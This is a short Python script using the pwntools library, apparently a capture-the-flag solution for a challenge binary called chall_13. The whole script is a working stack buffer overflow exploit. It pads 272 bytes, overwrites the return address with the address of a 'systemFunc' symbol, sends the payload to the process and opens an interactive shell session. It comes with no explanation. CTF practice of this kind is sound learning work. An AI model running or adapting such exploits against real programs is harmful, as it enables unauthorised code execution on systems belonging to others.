# coding: utf-8
from pwn import *
#0x10c
elf=ELF("./chall_13")
payload = b'a'*272+p32(elf.sym.systemFunc)
#payload
p=process("./chall_13")
p.sendline(payload)
p.interactive()
